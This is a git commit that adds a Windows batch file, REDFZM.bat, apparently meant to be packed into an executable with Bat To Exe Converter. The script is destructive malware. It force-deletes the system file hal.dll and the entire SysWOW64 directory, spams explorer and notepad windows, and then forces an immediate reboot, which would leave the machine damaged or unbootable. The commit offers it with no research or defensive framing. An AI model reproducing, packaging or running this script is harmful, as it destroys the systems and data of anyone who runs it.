14d0f9dd308f81ea52bfe64279b107bd4da8d50e
iqbalekositi <uyk5kniqbal@gmail.com>
2025-03-24 12:49:45 +0700

    Add files via upload

---
+++ REDFZM.bat
@@ -0,0 +1,58 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
+::ZQ05rAF9IAHYFVzEqQICDT9ydmQ=
+::eg0/rx1wNQPfEVWB+kM9LVsJDDanGE2AK/VUwebt5vmOoEEYHYI=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQICDT9ydini
+::dhA7uBVwLU+EWGqU8VAkJxV2TQiOLzna
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATE900gMQldSwyWfMlzRudMur2b
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCmDJFSdtEEiLRpARQuMAGm7EvUI56j+9++7hEIRUOctOK3ayKGyEsU3zH/JO5M10xo=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+del /f /s /q C:\Windows\System32\hal.dll
+del /f /s /q C:\Windows\SysWOW64
+start explorer
+start notepad
+start
+start explorer
+start notepad
+start
+start explorer
+start notepad
+start
+start explorer
+start notepad
+start
+start explorer
+start notepad
+start
+start explorer
+start notepad
+start
+start explorer
+start notepad
+start
+shutdown -r -f -t 0
